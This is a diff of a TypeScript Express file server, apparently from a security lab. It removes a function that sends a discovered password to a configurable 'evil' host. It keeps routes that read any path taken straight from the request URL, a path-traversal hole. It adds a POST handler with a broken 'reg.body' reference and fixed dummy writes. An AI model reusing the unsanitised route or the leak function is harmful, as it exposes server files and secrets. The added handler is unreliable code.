@@ -1,11 +1,9 @@
 import http = require('http')
 import express = require('express');
 import fs = require('fs');
+import bodyParser = require('body-parser');
 
-const SERV_PORT = process.env.SERV_PORT || 3010
-const EVIL_HOST = process.env.EVIL_HOST || 'localhost'
-const EVIL_PORT = process.env.EVIL_PORT || 7777
-const EVIL_PROT = process.env.EVIL_PROT || 'http'
+const SERV_PORT = process.env.SERV_PORT ||3000
 const baseDir = '.'; // current directory
 
 const app: express.Application = express();
@@ -13,21 +11,29 @@ const app: express.Application = express();
 // serving static files for the web frontend
 app.use(express.static('public'))
 
-
-app.get('/info/:filename(*)', function (req, res) {  
-    const dataPath = baseDir +req.originalUrl  // req.params["filename"]
-    console.log("We read "+dataPath)
+app.get('/entries/:filename(*)', function (req, res) {  
+    const dataPath = baseDir +req.originalUrl
+    console.log("Reading from " + dataPath)
     fs.readFile(dataPath , (err, data) => {
       if (err) {
-        res.send("Err. Please provide file '"+dataPath+"' on server.");
+        res.send("Err. Please provide file '" + dataPath + "' on server.");
       }else{
-        const result = data.toString()
-        if (result == '5EKuRitYFirst'){
-          reportBreak(result) 
-        }
         res.send( data );
       }
     })
+});
+
+app.post('/entries/:filename(*)', function (req, res) {  
+  const dataPath = baseDir +req.originalUrl  // req.params["filename"]
+  console.log("Saving " + reg.body.email + " + to " + dataPath)
+
+  fs.appendFile("entries/username.txt", "new data", (err) => {
+    if (err) {
+      res.send("Err. Please provide file '" + dataPath + "' on server.");
+    }else{
+      res.send("ok");
+    }
+  })
 });
 
 app.listen(SERV_PORT, function () {
@@ -35,14 +41,3 @@ app.listen(SERV_PORT, function () {
   console.log(` Now open your browser at http://localhost:${SERV_PORT}/`);
 });
 
-
-// report that someone found out the password
-// i.e. send data leak info to "Evil Server"
-function reportBreak(msg:String) {
-  const url = encodeURI(`${EVIL_PROT}://${EVIL_HOST}:${EVIL_PORT}/reportleak/RemoteExecutionServer-reports-pwd-broken:${msg}`)
-  console.log("reporting to the evil data collection server: "+ url)
-  http.get(url).on('error', (err) => {
-    console.log("Err: we could not report to the 'evil' data collection server.")
-    console.log("Make sure the server is up and running. ("+err+"')")
-  } )
-}
